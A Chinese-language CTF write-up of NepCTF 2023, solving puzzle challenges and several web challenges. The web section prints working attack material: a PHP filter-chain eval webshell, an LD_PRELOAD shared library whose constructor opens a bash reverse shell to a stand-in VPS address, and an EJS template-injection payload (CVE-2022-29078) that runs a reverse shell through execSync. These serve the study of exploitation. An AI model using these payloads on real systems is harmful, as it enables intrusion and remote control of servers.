---
title: "NepCTF 2023"
description: "NepCTF 2023 Writeup"

date: 2023-08-17T09:19:39+08:00
lastmod: 2025-11-10T17:17:45+08:00

math: true
mermaid: true

categories:
  - Writeup
tags:
  - CTF
---
<!--more-->

# MISC

## 与AI共舞的哈夫曼

将给的代码扔给gpt，发现缺少一段代码，直接让它帮写出来

```python
def decompress(input_file, output_file):
    with open(input_file, 'rb') as f:
        # Read frequency information
        num_symbols = ord(f.read(1))
        frequencies = {}
        for _ in range(num_symbols):
            byte, freq_bytes = f.read(1)[0], f.read(4)
            freq = (freq_bytes[0] << 24) | (freq_bytes[1] << 16) | (freq_bytes[2] << 8) | freq_bytes[3]
            frequencies[byte] = freq

        # Rebuild Huffman tree
        root = build_huffman_tree(frequencies)

        # Read compressed data
        compressed_data = f.read()
        bit_string = ''.join(format(byte, '08b') for byte in compressed_data)

    current_node = root
    decompressed_data = []
    for bit in bit_string:
        if bit == '0':
            current_node = current_node.left
        else:
            current_node = current_node.right

        if current_node.char is not None:
            decompressed_data.append(current_node.char)
            current_node = root

    with open(output_file, 'wb') as f:
        f.write(bytes(decompressed_data))
```

## codes

进去是个C语言的代码执行器

![image-20240607191130216](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191132561-1398252466.png)

提示说环境变量里面有flag，尝试打印环境变量

[linux下获取系统环境变量](https://blog.csdn.net/aspnet_lyc/article/details/20548767)

```c
#include <stdio.h>
 
int main(int argc, char** argv, char** arge)
{
	while(*arge)
	{
		printf("%s\n", *arge++);
	}
	return 0;
}
```

![image-20240607191146952](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191149590-996029833.png)

## 陌生的语言

![image-20240607191159956](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191202791-843148984.png)

给了hint：`Atsuko Kagari`

发现了这是一个动漫：小魔女学园

了解到这是新月文字和古龙语（我看像鸡脚语）

百度贴吧找到对照：

![image-20240607191207420](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191209889-1271665289.png)

`HEARTISYOURMAGIC`

![image-20240607191221615](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191223978-911331837.png)

`NEPNEPABELIEVING`

拼起来

```txt
NepCTF{NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC}
```

## 小叮弹钢琴

下载后发现是一段音频，用Audacity打开

![image-20240607191239458](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191242189-641817492.png)

发现不是长就是短的，猜测是摩斯密码，一个个对，发现真是，得到提示

`you should use this to xor something`

![image-20240607191246544](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191249141-1826519038.png)

发现了一段字符串

`0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17`

看提示应该是要寻找另一串字符串，尝试与题目给的字符串异或

![image-20240607191300598](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191302916-1511626233.png)

## 你也喜欢三月七么

> 三月七：耶，终于来到Nepnep星球啦，让我看看正在火热进行的Hacker夺旗大赛群聊。啊！开拓者，这群名看起来怪怪的诶。 （伸出脑袋，凑近群名，轻轻的闻了一下）哇，好咸诶，开拓者你快来看看！
>
> 开拓者（U_id）：(端着下巴，磨蹭了一下，眼神若有所思）这好像需要经过啥256处理一下才能得到我们需要的关键。
>
> 三月七：那我们快想想怎么解开这个谜题！
>
> flag格式:NepCTF{+m+}
>
> hint:URL为压缩包密码

**txt文件：**

```txt
salt_lenth= 10 
key_lenth= 16 
iv= 88219bdee9c396eca3c637c0ea436058 #原始iv转hex的值
ciphertext= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc
```

题目描述：群名很咸，`salt`（长度为10），因为加了NepCTF的QQ群，发现群名`NepCTF2023`正好长度为十，推测`salt：NepCTF2023`

经过啥256处理一下才能得到我们需要的关键：推出sha256后得到key(关键)

猜测我们对`NepCTF2023`经过sha256后可以得到`key` ，取出前32位：

```txt
dd8e671df3882c5be6423cd030bd7cb6
```

然后AES解密=>hex解密=>base64解密：

![image-20240607191318564](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191320995-2136655502.png)

https://img1.imgtp.com/2023/07/24/yOkXWSJT.png

![image-20240607191333168](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191335428-165194366.png)

**星穹铁道文字：**

![image-20240607191340302](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191342624-545869757.png)

**翻译一下：**

```txt
NepCTF{HRP_always_likes_March_7th}
```

# web

## Ezjava_Chekin

[详细shiro漏洞复现及利用方法（CVE-2016-4437）](https://blog.csdn.net/dreamthe/article/details/124390531?ops_request_misc=&request_id=&biz_id=102&utm_term=shiro_attack-4.7.0-SNAPSHOT-al&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-124390531.142^v92^koosearch_v1&spm=1018.2226.3001.4187)

直接利用shiro反序列化工具一把梭

![image-20240607191359010](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191401318-584320209.png)

注入内存马（换jsp类型）

![image-20240607191409148](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191411410-747375604.png)

连接成功

![image-20240607191414424](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191416770-1165957202.png)

查看start.sh

![image-20240607191420079](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191422311-1273897623.png)

## Ez_include

进入页面，有如下界面

![image-20240607191440315](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191442495-1317549732.png)

将`?`后面的内容删去后方访问：

![image-20240607191448460](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191450697-526892477.png)

提示让我们访问`/jump.php?hint`

![image-20240607191455085](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191457513-892001261.png)

发现这是一个文件包含，且加后缀`.txt`，在注释里提示可以访问`hint.ini`

![image-20240607191501073](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191503283-697759397.png)

发现远程文件包含利用不了，提示里有一篇文章：https://tttang.com/archive/1395/

可以在github上找到利用脚本：https://github.com/synacktiv/php_filter_chain_generator

```sh
python3 php_filter_chain_generator.py --chain "<?php eval($_POST[1]);?>"
```

![image-20240607191512382](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191514739-1208798047.png)

这样就成功了

![image-20240607191515814](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191518322-1944982368.png)

但是查看一下`disable_functions、disable_classes` 把很多的函数和类给禁用了,还限制了`open_basedir=/var/www/html:/tmp`

所以我们需要想办法 `php disable_function bypass`

![image-20240607191536009](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191538245-1265049974.png)

**劫持LD_PRELOAD绕过disable_functions**

> LD_PRELOAD指定的动态链接库文件，会在其它文件调用之前先被调用
>
> 劫持步骤：
>
> 1. 生成一个我们的恶意动态链接库文件
> 2. 利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径
> 3. 配合php的某个函数去触发我们的恶意动态链接库文件
> 4. Getshell

这个php的函数很关键。可以使用`mail、error_log`等，但是这里被禁用了

我们还可以使用`mb_send_mail()`

![image-20240607191542830](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191545005-427713125.png)

它是`mail()`的包装函数，因此也可以进行劫持

我们需要先编写一个恶意poc.c文件：(用来反弹shell)

> __attribute__语法格式为：__attribute__ ( ( attribute-list ) )
> 若函数被设定为constructor属性，则该函数会在main（）函数执行之前被自动的执行。类似的，若函数被设定为destructor属性，
> 则该函数会在main（）函数执行之后或者exit（）被调用后被自动的执行。例如下面的程序：

```c
#include <stdio.h>
#include <unistd.h>
#include <stdio.h>
__attribute__ ((__constructor__)) void angel (void){
    unsetenv("LD_PRELOAD");
    system("bash -c 'bash -i >& /dev/tcp/vpsip/port 0>&1'");
}
```

然后编译一下生成恶意动态链接程序`poc.so`：

```sh
gcc -c -fPIC poc.c -o poc
gcc --share poc -o poc.so
```

![image-20240607191551703](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191554006-1255129554.png)

然后需要把这个文件给上传到服务器上去，并且使用`putenv()`函数重新设置`LD_PRELOAD`环境变量，最后使用`mb_send_mail()`调用恶意的函数进行反弹shell

但是这里有个问题，我们没权限上传文件和写文件，相关函数被禁用了。

这里有一种方法是上传临时文件`/tmp/phpxxx`，然后使用`scandir("glob:///tmp/php*")`去模糊匹配的

在本地写一个上传文件的`html`：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>POST文件上传</title>
</head>
<body>
<form action="url" method="post" enctype="multipart/form-data">
    <label for="file">文件名：</label>
    <input  type="file" name="file"  id="file"><br>
    <<input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

将恶意的`.so`文件上传并抓包，将数据包下面内容进行更改：

```sh
Content-Disposition: form-data; name="1"

var_dump(scandir('/tmp'));$a=scandir("glob:///tmp/php*");$filename="/tmp/".$a[0];var_dump($filename);putenv("LD_PRELOAD=$filename");mb_send_mail("","","");
```

![image-20240607191601339](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191603773-362245868.png)

发送后，可以看到，反弹shell成功了

![image-20240607191614906](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191617064-2120297057.png)

利用的是php产生的临时文件，而这个临时文件的文件名是**随机**的，因此用**glob伪协议**去锁定。然后劫持

触发LD_PRELOAD的函数，常见的2个`mail、error_log`都可以触发系统函数`send_mail`进而触发LD劫持，但是这里ban了这2个函数，因此还有个替代品`mb_send_mail`最后RCE

在根目录下查看到flag

![image-20240607191628575](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191630804-1894573378.png)

但是发现没有权限：

![image-20240607191634986](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191637136-1283389099.png)

用环境变量提权。因为我们有一个suid的二进制文件`showmsg`

![image-20240607191642261](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191644575-741172198.png)提权成功，然后给777权限给flag，直接读就好了

![image-20240607191652430](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191654692-265270369.png)

## Post Crad For You

先拿到题目代码

```javascript
var path = require('path');
const fs = require('fs');
const crypto = require("crypto");

const express = require('express')
const app = express()
const port = 3000

templateDir = path.join(__dirname, 'template');
app.set('view engine', 'ejs');
app.set('template', templateDir);

function sleep(milliSeconds){
    var StartTime =new Date().getTime();
    let i = 0;
    while (new Date().getTime() <StartTime+milliSeconds);

}

app.get('/', function(req, res) {
    return res.sendFile('./index.html', {root: __dirname});
});

app.get('/create', function(req, res) {
    let uuid;
    let name = req.query.name ?? '';
    let address = req.query.address ?? '';
    let message = req.query.message ?? '';
    do {
        uuid = crypto.randomUUID();
    } while (fs.existsSync(`${templateDir}/${uuid}.ejs`))

    try {
        if (name != '' && address != '' && message != '') {
            let source = ["source", "source1", "source2", "source3"].sort(function(){
                return 0.5 - Math.random();
            })
            fs.readFile(source[0]+".html", 'utf8',function(err, pageContent){
                fs.writeFileSync(`${templateDir}/${uuid}.ejs`, pageContent.replace(/--ID--/g, uuid.replace(/-/g, "")));
                sleep(2000);
            })
        } else {
            res.status(500).send("Params `name` or `address` or `message` empty");
            return;
        }
    } catch(err) {
        res.status(500).send("Failed to write file");
        return;
    }

    return res.redirect(`/page?pageid=${uuid}&name=${name}&address=${address}&message=${message}`);
});

app.get('/page', (req,res) => {
    let id = req.query.pageid
    if (!/^[0-9A-F]{8}-[0-9A-F]{4}-[4][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i.test(id) || !fs.existsSync(`${templateDir}/${id}.ejs`)) {
        res.status(404).send("Sorry, no such id")
        return;
    }
    res.render(`${templateDir}/${id}.ejs`, req.query);
})

app.listen(port, () => {
    console.log(`App listening on port ${port}`)
})
```

发现``res.render(`${templateDir}/${id}.ejs`, req.query);``这段有模板注入的，他把query放进去render了。

网上是有关于这个的CVE：[CVE-2022-29078](https://inhann.top/2023/03/26/ejs/)

**payload：**

在url后加入：

```txt
&settings[view options][escapeFunction]=console.log;this.global.process.mainModule.require('child_process').execSync("bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%20%3C%261'");&settings[view options][client]=true
```

![image-20240607191713978](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191716473-2064343561.png)

反弹shell成功！

![image-20240607191723486](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191726007-1545553940.png)

![image-20240607191729610](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191731934-1706873529.png)